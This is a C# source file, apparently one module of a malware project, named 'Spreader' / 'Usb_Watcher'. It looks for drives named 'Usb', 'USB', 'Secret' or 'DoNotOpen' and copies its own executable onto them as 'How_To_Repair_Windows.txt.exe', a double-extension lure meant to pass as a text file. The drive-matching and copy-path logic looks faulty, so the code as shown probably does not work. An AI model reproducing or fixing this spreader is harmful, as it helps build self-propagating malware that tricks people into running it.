using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Nullable.Modules.Spreader
{
    internal sealed class Usb_Watcher
    {
        public static void Activate()
        {
            string[] Names =
            {
                "Usb",
                "USB",
                "Secret",
                "DoNotOpen"
            };
            DriveInfo[] Drives = DriveInfo.GetDrives();
            foreach (DriveInfo x in Drives)
            {
                foreach(string L in Names)
                {
                    if (x.ToString() == L)
                    {
                        File.Copy(Application.ExecutablePath, L + "\\How_To_Repair_Windows.txt.exe");
                    }
                }
            }            
        }
    }
}
